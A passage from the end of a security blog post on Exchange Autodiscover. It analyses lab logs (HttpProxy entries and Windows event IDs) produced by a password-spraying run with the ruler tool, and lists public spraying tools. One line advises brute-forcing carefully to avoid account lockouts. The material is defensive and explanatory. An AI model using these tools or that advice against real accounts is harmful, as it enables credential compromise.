+<ul>
+<li>Windows security logs : Logon success / failure</li>
+<li>Exchange HttpProxy logs : ExchangeDir/HttpProxy/Autodiscover/*</li>
+<li>Exchange Autodiscover logs : ExchangeDir/Autodiscover/*</li>
+</ul>
+<p><strong>IMPORTANT</strong> : This is <strong>ABSOLUTLY NOT EXHAUSTIVE</strong>, if you know more log sources regarding the Autodiscover endpoint please DM me on twitter @ottersecx !</p>
+<h2 id="31-httpproxy-logs">3.1 HttpProxy logs</h2>
+<p><em>Important fields</em> : <strong>DateTime, AuthenticationType, AuthenticatedUser, UserAgent, ClientIpAddress</strong></p>
+<p>I&rsquo;ve launched a quick brute force attack against the different users of the test.local domain : anakin,yoda,administrator and darthvader with the <strong>ruler</strong> tool.</p>
+<p>Let&rsquo;s analyze this log extract and see what have been done by the malicious actor :</p>
+<pre tabindex="0"><code># Log entry with some success and failure
+DateTime,RequestId,MajorVersion,MinorVersion,BuildVersion,RevisionVersion,ClientRequestId,Protocol,UrlHost,UrlStem,ProtocolAction,AuthenticationType,IsAuthenticated,AuthenticatedUser,Organization,AnchorMailbox,UserAgent,ClientIpAddress,ServerHostName,HttpStatus,BackEndStatus,ErrorCode,Method,ProxyAction,TargetServer,TargetServerVersion,RoutingType,RoutingHint,BackEndCookie,ServerLocatorHost,ServerLocatorLatency,RequestBytes,ResponseBytes,TargetOutstandingRequests,AuthModulePerfContext,HttpPipelineLatency,CalculateTargetBackEndLatency,GlsLatencyBreakup,TotalGlsLatency,AccountForestLatencyBreakup,TotalAccountForestLatency,ResourceForestLatencyBreakup,TotalResourceForestLatency,ADLatency,SharedCacheLatencyBreakup,TotalSharedCacheLatency,ActivityContextLifeTime,ModuleToHandlerSwitchingLatency,ClientReqStreamLatency,BackendReqInitLatency,BackendReqStreamLatency,BackendProcessingLatency,BackendRespInitLatency,BackendRespStreamLatency,ClientRespStreamLatency,KerberosAuthHeaderLatency,HandlerCompletionLatency,RequestHandlerLatency,HandlerToModuleSwitchingLatency,ProxyTime,CoreLatency,RoutingLatency,HttpProxyOverhead,TotalRequestTime,RouteRefresherLatency,UrlQuery,BackEndGenericInfo,GenericInfo,GenericErrors,EdgeTraceId,DatabaseGuid,UserADObjectGuid,PartitionEndpointLookupLatency,RoutingStatus
+#Software: Microsoft Exchange Server
+#Version: 15.01.2242.004
+#Log-type: HttpProxy Logs
+....
+1. 2022-04-29T13:35:11.036Z,6bbc05bb-fe33-4532-b1c6-ff29739e6496,15,1,2242,4,,Autodiscover,192.168.1.88,/autodiscover/autodiscover.xml,,NTLM,true,TEST\yoda,,Sid~S-1-5-21-1302956852-1588591240-2316589032-1145,ruler,192.168.1.80,EXCH1,200,200,,GET,Proxy,exch1.test.local,15.01.2242.000,IntraForest,WindowsIdentity,,,,0,349,,,2,24,,0,23;,23,,0,23,,0,211,0,,,,85,3,2,2,3,2,206,3,127,117,120,122,211,,,,BeginRequest=2022-04-29T13:35:10.813Z;CorrelationID=&lt;empty&gt;;ProxyState-Run=None;AccountForestGuard_test.local=1;FEAuth=BEVersion-1942063298;RoutingEntry=DatabaseGuid:99bddf19-a904-4711-aef0-80bd1589fd04%40test.local%40test.local Server:EXCH1.test.local+1942063298@637868347504812022;NewConnection=fe80::2533:7966:fc71:6cce%6&amp;0;BeginGetResponse=2022-04-29T13:35:10.895Z;OnResponseReady=2022-04-29T13:35:10.989Z;EndGetResponse=2022-04-29T13:35:10.992Z;ProxyState-Complete=ProxyResponseData;SharedCacheGuard=0;EndRequest=2022-04-29T13:35:11.036Z;I32:ATE.C[DC.test.local]=3;F:ATE.AL[DC.test.local]=0.3333333;I32:ADS.C[DC]=3;F:ADS.AL[DC]=5.536716;Dbl:VCGS.T[EXCH1]=0;I32:VCGS.C[EXCH1]=6,,,|RoutingDB:99bddf19-a904-4711-aef0-80bd1589fd04,,,CafeV1
+2. 2022-04-29T13:35:11.320Z,7941d214-3482-4d9f-a3b4-ba048b0d32be,15,1,2242,4,,Autodiscover,192.168.1.88,/autodiscover/autodiscover.xml,,NTLM,false,,,,ruler,192.168.1.80,EXCH1,401,,,GET,,,,,,,,,0,,,,,,,,,,,,,,,0,,,,,,,,,,,,,,0,,0,0,,,,BeginRequest=2022-04-29T13:35:11.320Z;CorrelationID=&lt;empty&gt;;SharedCacheGuard=0;EndRequest=2022-04-29T13:35:11.320Z;,,,,,,
+3. 2022-04-29T13:35:11.324Z,3bdcfacb-2fa2-4c33-bc18-732da6d573bf,15,1,2242,4,,Autodiscover,192.168.1.88,/autodiscover/autodiscover.xml,,NTLM,false,,,,ruler,192.168.1.80,EXCH1,401,,,GET,,,,,,,,,0,,,,,,,,,,,,,,,2,,,,,,,,,,,,,,2,,2,2,,,,BeginRequest=2022-04-29T13:35:11.321Z;CorrelationID=&lt;empty&gt;;SharedCacheGuard=0;EndRequest=2022-04-29T13:35:11.324Z;,,,,,,
+4. 2022-04-29T13:35:11.830Z,4a612a05-8da8-4520-94ff-021427f8f0c1,15,1,2242,4,,Autodiscover,192.168.1.88,/autodiscover/autodiscover.xml,,NTLM,false,,,,ruler,192.168.1.80,EXCH1,401,,,GET,,,,,,,,,0,,,,,,,,,,,,,,,0,,,,,,,,,,,,,,0,,0,0,,,,BeginRequest=2022-04-29T13:35:11.829Z;CorrelationID=&lt;empty&gt;;SharedCacheGuard=0;EndRequest=2022-04-29T13:35:11.830Z;,,,,,,
+5. 2022-04-29T13:35:11.832Z,bc273fa9-163b-435d-baff-b38263604d7e,15,1,2242,4,,Autodiscover,192.168.1.88,/autodiscover/autodiscover.xml,,NTLM,false,,,,ruler,192.168.1.80,EXCH1,401,,,GET,,,,,,,,,0,,,,,,,,,,,,,,,2,,,,,,,,,,,,,,1,,1,1,,,,BeginRequest=2022-04-29T13:35:11.831Z;CorrelationID=&lt;empty&gt;;SharedCacheGuard=0;EndRequest=2022-04-29T13:35:11.832Z;,,,,,,
+6. 2022-04-29T13:35:12.329Z,ee9b9ca9-ce3f-4acc-9c7c-4b6f6306513d,15,1,2242,4,,Autodiscover,192.168.1.88,/autodiscover/autodiscover.xml,,NTLM,false,,,,ruler,192.168.1.80,EXCH1,401,,,GET,,,,,,,,,0,,,,,,,,,,,,,,,0,,,,,,,,,,,,,,0,,0,0,,,,BeginRequest=2022-04-29T13:35:12.329Z;CorrelationID=&lt;empty&gt;;SharedCacheGuard=0;EndRequest=2022-04-29T13:35:12.329Z;,,,,,,
+7. 2022-04-29T13:40:15.848Z,d42748d5-88da-4f3f-be87-37690605d41e,15,1,2242,4,,Autodiscover,192.168.1.88,/autodiscover/autodiscover.xml,,NTLM,false,,,,ruler,192.168.1.80,EXCH1,401,,,GET,,,,,,,,,0,,,,,,,,,,,,,,,0,,,,,,,,,,,,,,0,,0,0,,,,BeginRequest=2022-04-29T13:40:15.847Z;CorrelationID=&lt;empty&gt;;SharedCacheGuard=0;EndRequest=2022-04-29T13:40:15.848Z;,,,,,,
+8. 2022-04-29T13:40:15.867Z,4dba6254-b1dd-4a9d-88bb-d86f51a604f1,15,1,2242,4,,Autodiscover,192.168.1.88,/autodiscover/autodiscover.xml,,NTLM,true,TEST\Administrator,,Sid~S-1-5-21-1302956852-1588591240-2316589032-500,ruler,192.168.1.80,EXCH1,200,200,,GET,Proxy,exch1.test.local,15.01.2242.000,IntraForest,WindowsIdentity,,,,0,349,,,2,4,,0,3;,3,,0,3,,0,18,0,,,,7,2,0,0,0,0,15,1,9,7,9,11,18,,,,BeginRequest=2022-04-29T13:40:15.849Z;CorrelationID=&lt;empty&gt;;ProxyState-Run=None;AccountForestGuard_test.local=1;FEAuth=BEVersion-1942063298;RoutingEntry=DatabaseGuid:99bddf19-a904-4711-aef0-80bd1589fd04%40test.local%40test.local Server:EXCH1.test.local+1942063298@637868347504812022;NewConnection=fe80::2533:7966:fc71:6cce%6&amp;0;BeginGetResponse=2022-04-29T13:40:15.859Z;OnResponseReady=2022-04-29T13:40:15.866Z;EndGetResponse=2022-04-29T13:40:15.866Z;ProxyState-Complete=ProxyResponseData;SharedCacheGuard=0;EndRequest=2022-04-29T13:40:15.867Z;I32:ATE.C[DC.test.local]=1;F:ATE.AL[DC.test.local]=0;I32:ADS.C[DC]=1;F:ADS.AL[DC]=2.404126,,,|RoutingDB:99bddf19-a904-4711-aef0-80bd1589fd04,,,CafeV1
+</code></pre><p>As we can see on our log we can easily identify the following :</p>
+<ul>
+<li>Many entries with the user agent <strong>ruler</strong> trying to authenticate to the <strong>/autodiscover/autodiscover.xml</strong> URI but getting a <strong>wrong credential</strong> answer (e.g:HTTP 401) with the source IP addresse of <strong>192.168.1.80</strong> (log entry 2-7).</li>
+<li>Two successful authentication (e.g: HTTP 200) on the same <strong>URI</strong> with the same <strong>user agent</strong> : <a href="mailto:yoda@test.local">yoda@test.local</a> and <a href="mailto:administrator@test.local">administrator@test.local</a></li>
+</ul>
+<p>From the following pattern we can pretty surely tell that the malicious actor successfuly <strong>compromised</strong> two users (e.g: yoda and administrator) while password spraying the Autodiscover endpoint.</p>
+<p>Intrestingly enough the log does not yield the <strong>username</strong> if the authentication is a failure !</p>
+<p><em>Note : Act carrefuly while brute forcing the autodisocver endpoint as it will lock the accounts according to the enforced policy on the domain</em></p>
+<h2 id="32-windows-security-logs">3.2 Windows security logs</h2>
+<p>Regarding the Windows security logs on the Exchange Server we can see that the <em>classic</em> authentication logs are generated :</p>
+<ul>
+<li>Event 4625 : Logon failure</li>
+<li>Event 4624 : Logon Success</li>
+</ul>
+<p>Let&rsquo;s analyze the following screenshot :
+<img src="/img/windowsseclogs.png" alt="windowssec"></p>
+<p>As we can see here severale <strong>logon failure</strong> regarding differents users are generated in a short time frame which may imply a brute force or a password spraying.</p>
+<p><em>Note : We can see here an event id 4672 which is a &lsquo;Special Logon&rsquo;. This is because we authenticated as a Domain Administrator which is a Special Logon</em>
+*Note 2 : They may be more event id that can be usefull ! DM me @ottersecx in case you happend to know more of them :)</p>
+<h2 id="33-autodiscover-logs">3.3 Autodiscover logs</h2>
+<p>Unfortunately the Autodiscover logs seems quite useless when it comes to security logs as it is mostly designed arround the health of the Autodiscover service.</p>
+<h1 id="4-ressources-and-tools">4. Ressources and tools</h1>
+<p>All of the following ressources has been used in order to make this blog post. None of what was described here is new.</p>
+<h1 id="41-ressources">4.1 Ressources</h1>
+<p>Attacking MS Exchange Web Interfaces : <a href="https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/">https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/</a> <br>
+Bouncing Off Clouds Taking What O365 Gives You : <a href="https://www.redsiege.com/wp-content/uploads/2021/06/O365UserEnumeration_PasswordAttacks.pdf">https://www.redsiege.com/wp-content/uploads/2021/06/O365UserEnumeration_PasswordAttacks.pdf</a> <br>
+MS-OXDSCLI : <a href="https://interoperability.blob.core.windows.net/files/MS-OXDSCLI/%5bMS-OXDSCLI%5d.pdf">https://interoperability.blob.core.windows.net/files/MS-OXDSCLI/%5bMS-OXDSCLI%5d.pdf</a> <br>
+MS-OXDISCO : <a href="https://interoperability.blob.core.windows.net/files/MS-OXDISCO/%5bMS-OXDISCO%5d.pdf">https://interoperability.blob.core.windows.net/files/MS-OXDISCO/%5bMS-OXDISCO%5d.pdf</a>
+Event ID : <a href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/">https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/</a></p>
+<h1 id="42-tools">4.2 Tools</h1>
+<p>o365spray : <a href="https://github.com/0xZDH/o365spray">https://github.com/0xZDH/o365spray</a> <br>
+SprayingToolkit : <a href="https://github.com/byt3bl33d3r/SprayingToolkit">https://github.com/byt3bl33d3r/SprayingToolkit</a> <br>
+o365creeper : <a href="https://github.com/LMGsec/o365creeper">https://github.com/LMGsec/o365creeper</a> <br>
+Carnivore : <a href="https://github.com/ReverendThing/Carnivore">https://github.com/ReverendThing/Carnivore</a> <br>
+adfspray : <a href="https://github.com/xFreed0m/adfspray">https://github.com/xFreed0m/adfspray</a> <br>
+ruler : <a href="https://github.com/sensepost/ruler">https://github.com/sensepost/ruler</a></p>
+<section class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1" role="doc-endnote">
+<p>This is highly inefficient and mostly useless 99% of the time.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</section>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/about">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#11-ms-oxdisco">1.1 [MS-OXDISCO]</a>
+      <ul>
+        <li><a href="#111-ldap-service-connection-point">1.1.1 LDAP service connection point</a></li>
+        <li><a href="#112-dns-srv-record-">1.1.2 DNS SRV record :</a></li>
+        <li><a href="#113-constructed-domain-uris">1.1.3 Constructed domain URIs</a></li>
+      </ul>
+    </li>
+    <li><a href="#12-ms-oxdscli">1.2 [MS-OXDSCLI]</a>
+      <ul>
+        <li><a href="#121-autodiscover-request">1.2.1 Autodiscover request</a></li>
+        <li><a href="#122-autodiscover-response">1.2.2 Autodiscover response</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#21-unauthenticated-attack">2.1 Unauthenticated attack</a></li>
+    <li><a href="#22-authenticated-abuse">2.2 Authenticated abuse</a></li>
+    <li><a href="#23-bonus--autodiscover-in-the-cloud">2.3 Bonus : Autodiscover in the Cloud</a>
+      <ul>
+        <li><a href="#231-autodiscover-unauthenticated">2.3.1 Autodiscover unauthenticated</a></li>
+        <li><a href="#232-autodiscover-password-spraying">2.3.2 Autodiscover password spraying</a></li>
+      </ul>
+    </li>
+    <li><a href="#24-summary">2.4 Summary</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#31-httpproxy-logs">3.1 HttpProxy logs</a></li>
+    <li><a href="#32-windows-security-logs">3.2 Windows security logs</a></li>
+    <li><a href="#33-autodiscover-logs">3.3 Autodiscover logs</a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=%2fposts%2fautodiscover101%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=%2fposts%2fautodiscover101%2f&text=Autodiscover%20101%20%3a%20%5bMS-OXDISC%5d%20%26%20%5bMS-OXDISCO%5d" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=%2fposts%2fautodiscover101%2f&title=Autodiscover%20101%20%3a%20%5bMS-OXDISC%5d%20%26%20%5bMS-OXDISCO%5d" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=%2fposts%2fautodiscover101%2f&is_video=false&description=Autodiscover%20101%20%3a%20%5bMS-OXDISC%5d%20%26%20%5bMS-OXDISCO%5d" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Autodiscover%20101%20%3a%20%5bMS-OXDISC%5d%20%26%20%5bMS-OXDISCO%5d&body=Check out this article: %2fposts%2fautodiscover101%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=%2fposts%2fautodiscover101%2f&title=Autodiscover%20101%20%3a%20%5bMS-OXDISC%5d%20%26%20%5bMS-OXDISCO%5d" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=%2fposts%2fautodiscover101%2f&title=Autodiscover%20101%20%3a%20%5bMS-OXDISC%5d%20%26%20%5bMS-OXDISCO%5d" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=%2fposts%2fautodiscover101%2f&name=Autodiscover%20101%20%3a%20%5bMS-OXDISC%5d%20%26%20%5bMS-OXDISCO%5d&description=0.%20Autodiscover%20101%20%3a%20A%20brief%20introduction%20We%20will%20start%20this%20series%20by%20analysing%20the%20Autodiscover%20protocol%20which%20is%20being%20actively%20used%20by%20the%20differents%20Exchange%20endpoints.%0aBased%20on%20the%20Microsoft%20documentation%20the%20Autodiscover%20sevice%20is%20part%20of%20the%20%26ldquo%3bDirectory%2fProfile%20Services%26rdquo%3b%20which%20can%20be%20broke%20down%20into%202%20important%20piece%20of%20documentation%20%3a%0a%20%5bMS-OXDISCO%5d%20%3a%20Specifies%20the%20Autodiscover%20HTTP%20Protocol%2c%20which%20will%20provide%20a%20way%20for%20the%20%26ldquo%3bAutodiscover%20clients%20to%20find%20Autodiscover%20server%26rdquo%3b%20by%20extending%20the%20DNS%20and%20LDAP%20services." aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=%2fposts%2fautodiscover101%2f&t=Autodiscover%20101%20%3a%20%5bMS-OXDISC%5d%20%26%20%5bMS-OXDISCO%5d" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2022   
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+<script src=/js/code-copy.js></script>
+
+
+
+
+</html>
